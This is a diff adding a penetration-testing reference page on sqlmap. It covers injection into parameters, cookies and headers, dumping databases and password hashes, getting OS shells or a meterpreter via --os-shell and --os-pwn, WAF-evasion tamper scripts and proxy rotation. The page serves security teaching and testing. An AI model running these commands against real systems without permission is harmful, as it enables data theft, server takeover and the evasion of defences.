@@ -1,0 +1,234 @@
+# SQLMap
+
+{{#include ../../banners/hacktricks-training.md}}
+
+This page is a compact operational guide for common sqlmap workflows. The more exhaustive [SQLMap cheatsheet](sqlmap/README.md) includes additional request, file-access, and tuning options.
+
+## Basic arguments for SQLmap
+
+### Generic
+
+```bash
+-u "<URL>"
+-p "<PARAM TO TEST>"
+--user-agent=SQLMAP
+--random-agent
+--threads=10
+--risk=3 #MAX
+--level=5 #MAX
+--dbms="<KNOWN DB TECH>"
+--os="<OS>"
+--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
+--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
+--proxy=PROXY
+```
+
+### Technique flags (`--technique`)
+
+The `--technique` argument defines which SQL injection methods sqlmap will attempt.  
+Each character in the string represents a technique:<sup>[[2]](#references)</sup>
+
+| Letter | Technique | Description |
+| ------ | --------- | ----------- |
+| B | Boolean-based blind | Uses true/false conditions to infer data |
+| E | Error-based | Leverages verbose DBMS error messages to exfiltrate results |
+| U | UNION query | Injects `UNION SELECT` statements to fetch data via the same channel |
+| S | Stacked queries | Adds additional statements separated by `;` |
+| T | Time-based blind | Relies on delays (`SLEEP`, `WAITFOR`) to detect injection |
+| Q | Inline / out-of-band | Uses functions such as `LOAD_FILE()` or OOB channels like DNS |
+
+Default order is `BEUSTQ`. You can rearrange or limit them, e.g. only Boolean and Time-based in that order:
+
+```bash
+sqlmap -u "http://target/?id=1" --technique="BT" --batch
+```
+
+### Retrieve Information
+
+#### Internal
+
+```bash
+--current-user #Get current user
+--is-dba #Check if current user is Admin
+--hostname #Get hostname
+--users #Get usernames od DB
+--passwords #Get passwords of users in DB
+```
+
+#### DB data
+
+```bash
+--all #Retrieve everything
+--dump #Dump DBMS database table entries
+--dbs #Names of the available databases
+--tables #Tables of a database ( -D <DB NAME> )
+--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
+```
+
+## Injection place
+
+### From Burp/ZAP capture
+
+Capture the request and create a req.txt file
+
+```bash
+sqlmap -r req.txt --current-user
+```
+
+### GET Request Injection
+
+```bash
+sqlmap -u "http://example.com/?id=1" -p id
+sqlmap -u "http://example.com/?id=*" -p id
+```
+
+### POST Request Injection
+
+```bash
+sqlmap -u "http://example.com" --data "username=*&password=*"
+```
+
+### Injections in Headers and other HTTP Methods
+
+```bash
+#Inside cookie
+sqlmap  -u "http://example.com" --cookie "mycookies=*"
+
+#Inside some header
+sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+sqlmap -u "http://example.com" --headers="referer:*"
+
+#PUT Method
+sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+#The injection is located at the '*'
+```
+
+### Second order injection
+
+```bash
+python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
+```
+
+### Shell
+
+```bash
+#Exec command
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
+
+#Simple Shell
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
+
+#Dropping a reverse-shell / meterpreter
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
+```
+
+### Crawl a website with SQLmap and auto-exploit
+
+```bash
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = accept default answers without interactive prompts
+--crawl = set the crawler's maximum link depth
+--forms = discover and test HTML forms
+```
+
+## Customizing Injection
+
+### Set a suffix
+
+```bash
+python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+```
+
+### Prefix
+
+```bash
+python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+```
+
+### Help finding boolean injection
+
+```bash
+# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
+sqlmap -r r.txt -p id --not-string ridiculous --batch
+```
+
+### Tamper
+
+```bash
+--tamper=name_of_the_tamper
+#In kali you can see all the tampers in /usr/share/sqlmap/tamper
+```
+
+| Tamper                       | Description                                                                                                                        |
+| :--------------------------- | :--------------------------------------------------------------------------------------------------------------------------------- |
+| apostrophemask.py            | Replaces apostrophe character with its UTF-8 full width counterpart                                                                |
+| apostrophenullencode.py      | Replaces apostrophe character with its illegal double unicode counterpart                                                          |
+| appendnullbyte.py            | Appends encoded NULL byte character at the end of payload                                                                          |
+| base64encode.py              | Base64 all characters in a given payload                                                                                           |
+| between.py                   | Replaces greater than operator \('>'\) with 'NOT BETWEEN 0 AND \#'                                                              |
+| bluecoat.py                  | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
+| chardoubleencode.py          | Double url-encodes all characters in a given payload \(not processing already encoded\)                                            |
+| commalesslimit.py            | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'                                                                       |
+| commalessmid.py              | Replaces instances like 'MID\(A, B, C\)' with 'MID\(A FROM B FOR C\)'                                                              |
+| concat2concatws.py           | Replaces instances like 'CONCAT\(A, B\)' with 'CONCAT_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)'                                          |
+| charencode.py                | Url-encodes all characters in a given payload \(not processing already encoded\)                                                   |
+| charunicodeencode.py         | Unicode-url-encodes non-encoded characters in a given payload \(not processing already encoded\). "%u0022"                         |
+| charunicodeescape.py         | Unicode-url-encodes non-encoded characters in a given payload \(not processing already encoded\). "\u0022"                         |
+| equaltolike.py               | Replaces all occurrences of the equality operator \('='\) with `LIKE`                                                            |
+| escapequotes.py              | Slash escape quotes \(' and "\)                                                                                                    |
+| greatest.py                  | Replaces greater than operator \('>'\) with 'GREATEST' counterpart                                                              |
+| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword                                                                                   |
+| ifnull2ifisnull.py           | Replaces instances like 'IFNULL\(A, B\)' with 'IF\(ISNULL\(A\), B, A\)'                                                            |
+| modsecurityversioned.py      | Embraces complete query with versioned comment                                                                                     |
+| modsecurityzeroversioned.py  | Embraces complete query with zero-versioned comment                                                                                |
+| multiplespaces.py            | Adds multiple spaces around SQL keywords                                                                                           |
+| nonrecursivereplacement.py   | Replaces predefined SQL keywords with representations suitable for replacement \(e.g. .replace\("SELECT", ""\)\) filters           |
+| percentage.py                | Adds a percentage sign \('%'\) in front of each character                                                                          |
+| overlongutf8.py              | Converts all characters in a given payload \(not processing already encoded\)                                                      |
+| randomcase.py                | Replaces each keyword character with random case value                                                                             |
+| randomcomments.py            | Add random comments to SQL keywords                                                                                                |
+| securesphere.py              | Appends special crafted string                                                                                                     |
+| sp_password.py               | Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs                                           |
+| space2comment.py             | Replaces space character \(' '\) with comments                                                                                     |
+| space2dash.py                | Replaces space character \(' '\) with a dash comment \('--'\) followed by a random string and a new line \('\n'\)                  |
+| space2hash.py                | Replaces space character \(' '\) with a pound character \('\#'\) followed by a random string and a new line \('\n'\)               |
+| space2morehash.py            | Replaces space character \(' '\) with a pound character \('\#'\) followed by a random string and a new line \('\n'\)               |
+| space2mssqlblank.py          | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters                            |
+| space2mssqlhash.py           | Replaces space character \(' '\) with a pound character \('\#'\) followed by a new line \('\n'\)                                   |
+| space2mysqlblank.py          | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters                            |
+| space2mysqldash.py           | Replaces space character \(' '\) with a dash comment \('--'\) followed by a new line \('\n'\)                                      |
+| space2plus.py                | Replaces space character \(' '\) with plus \('+'\)                                                                                 |
+| space2randomblank.py         | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters                            |
+| symboliclogical.py           | Replaces AND and OR logical operators with their symbolic counterparts \(&& and \|\|\)                                               |
+| unionalltounion.py           | Replaces UNION ALL SELECT with UNION SELECT                                                                                        |
+| unmagicquotes.py             | Replaces quote character \(') with a multi-byte combo %bf%27 together with generic comment at the end \(to make it work\)         |
+| uppercase.py                 | Replaces each keyword character with upper case value 'INSERT'                                                                     |
+| varnish.py                   | Append a HTTP header 'X-originating-IP'                                                                                            |
+| versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment                                                                    |
+| versionedmorekeywords.py     | Encloses each keyword with versioned MySQL comment                                                                                 |
+| xforwardedfor.py             | Append a fake HTTP header 'X-Forwarded-For'                                                                                        |
+| luanginxmore.py              | POST-only tamper that prepends millions of dummy parameters to exhaust Lua‑Nginx WAF parsers (e.g., Cloudflare).                   |
+
+`luanginxmore` generates ~4.2M random POST parameters before your payload; use it only with `--method=POST` and expect large request sizes to crash poorly configured Lua-Nginx WAFs.<sup>[[3]](#references)</sup>
+
+## Recent switches worth enabling (>=1.9.x)
+
+* **HTTP/2 transport**: `--http2` forces sqlmap to speak HTTP/2 (helpful against front-ends that rate-limit HTTP/1.1 but relax h2). Combine with `--force-ssl` to pin HTTPS.<sup>[[4]](#references)</sup>
+* **Proxy rotation**: `--proxy-file proxies.txt --proxy-freq 3` will rotate through a list, changing proxy every 3 requests to avoid IP-based throttling.<sup>[[1]](#references)</sup>
+* **Offline / purge modes**: `--offline` reuses cached session data without touching the target (zero network traffic), while `--purge` securely wipes the session/output directory when you’re done.
+* **Mobile UA emulation**: `--mobile` prompts you to spoof a popular smartphone User-Agent, useful on APIs that expose additional fields to mobile clients.
+
+## References
+
+- [1] [SQLMap Usage Wiki](https://github.com/sqlmapproject/sqlmap/wiki/usage)
+- [2] [SQLMap: Testing SQL Database Vulnerabilities](https://blog.bughunt.com.br/sqlmap-vulnerabilidades-banco-de-dados/)
+- [3] [luanginxmore tamper (sqlmap GitHub)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/luanginxmore.py)
+- [4] [SQLMap Command Builder (flags summary incl. HTTP/2)](https://vizzdoom.github.io/sqlmap-command-builder/)
+
+{{#include ../../banners/hacktricks-training.md}}
